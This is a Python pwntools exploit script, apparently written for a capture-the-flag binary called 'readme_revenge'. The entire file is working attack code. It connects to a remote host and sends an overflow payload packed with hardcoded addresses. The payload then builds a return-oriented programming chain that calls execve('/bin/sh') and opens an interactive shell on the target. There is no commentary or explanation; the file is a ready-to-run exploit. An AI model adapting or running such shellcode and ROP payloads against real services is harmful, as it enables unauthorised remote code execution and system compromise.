#!/usr/bin/env python
import sys, os
from pwn import *
from struct import pack

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
elf = ELF('readme_revenge'); context.word_size = elf.elfclass
with context.local(log_level='ERROR'):
    libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
if not libc: log.warning('Cannot open libc.so.6')

r = remote(HOST, PORT)
pause()

jmp1 = 0x46D935 
jmp2 = 0x46d935
name = 0x6b73e0
rop_addr = 0x6b7ab0 
pop_rdi = 0x400525
pop_rsi = 0x4059d6 
pop_rdx = 0x435435
pop_rax = 0x43364c
syscall = 0x45fa15
binsh_addr = 0x6b7a38 

rop = flat(pop_rdi, binsh_addr, pop_rsi, 0, pop_rdx, 0, pop_rax, 59, syscall)

exp = flat(jmp1, jmp2, 0, 0)
exp = exp.ljust(1248, '\x90') + p64(0x00000000004a1a79)
exp = exp.ljust(1328, '\x90') + p64(rop_addr)
exp = exp.ljust(1608, 'a')
exp += p64(0x6b7048+8) + p64(0) 
exp += '/bin/sh'.ljust(112, '\x00')
exp += p64(0x6b7048)#"i"*8
exp += rop

r.sendline(exp)

r.send('g'*0x300)

r.interactive()
